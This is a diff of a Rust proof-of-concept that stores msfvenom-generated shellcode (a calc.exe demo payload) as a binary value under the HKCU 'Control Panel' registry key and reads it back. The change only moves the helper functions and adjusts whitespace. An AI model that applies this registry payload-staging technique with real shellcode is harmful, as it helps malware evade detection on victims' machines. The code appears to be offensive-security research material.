@@ -7,45 +7,6 @@ use windows::{
     },
 };
 
-fn write_registry(buf: &[u8]) -> Result<()> {
-    unsafe {
-        let mut hkey: HKEY = HKEY::default();
-        let _status = RegOpenKeyExA(
-            HKEY_CURRENT_USER,
-            s!("Control Panel"),
-            0,
-            KEY_SET_VALUE,
-            &mut hkey,
-        )?;
-
-        // Enter your key name here
-        RegSetValueExA(hkey, s!("victorteste"), 0, REG_BINARY, Some(&buf))?;
-
-        RegCloseKey(hkey)
-    }
-}
-
-fn read_registry(size: usize) -> Result<Vec<u8>> {
-    unsafe {
-        let mut data = vec![0u8; size];
-        let payload = data.as_mut_ptr() as *mut c_void;
-        let mut data_size = size as u32;
-
-        // Read the value from the registry
-        RegGetValueA(
-            HKEY_CURRENT_USER,
-            s!("Control Panel"),
-            s!("victorteste"),
-            RRF_RT_ANY,
-            Some(&mut REG_VALUE_TYPE(0)),
-            Some(payload),
-            Some(&mut data_size),
-        )?;
-
-        Ok(data)
-    }
-}
-
 // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
 const SHELLCODE: [u8; 276] = [
     0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
@@ -75,7 +36,45 @@ fn main() -> Result<()> {
     
     // Reading from the registry
     let data = read_registry(SHELLCODE.len())?;
-    
     println!("{:?}", data);
+
     Ok(())
+}
+
+fn write_registry(buf: &[u8]) -> Result<()> {
+    unsafe {
+        let mut hkey: HKEY = HKEY::default();
+        RegOpenKeyExA(
+            HKEY_CURRENT_USER,
+            s!("Control Panel"),
+            0,
+            KEY_SET_VALUE,
+            &mut hkey,
+        )?;
+
+        // Enter your key name here
+        RegSetValueExA(hkey, s!("victorteste"), 0, REG_BINARY, Some(&buf))?;
+        RegCloseKey(hkey)
+    }
+}
+
+fn read_registry(size: usize) -> Result<Vec<u8>> {
+    unsafe {
+        let mut data = vec![0u8; size];
+        let payload = data.as_mut_ptr() as *mut c_void;
+        let mut data_size = size as u32;
+
+        // Read the value from the registry
+        RegGetValueA(
+            HKEY_CURRENT_USER,
+            s!("Control Panel"),
+            s!("victorteste"),
+            RRF_RT_ANY,
+            Some(&mut REG_VALUE_TYPE(0)),
+            Some(payload),
+            Some(&mut data_size),
+        )?;
+
+        Ok(data)
+    }
 }
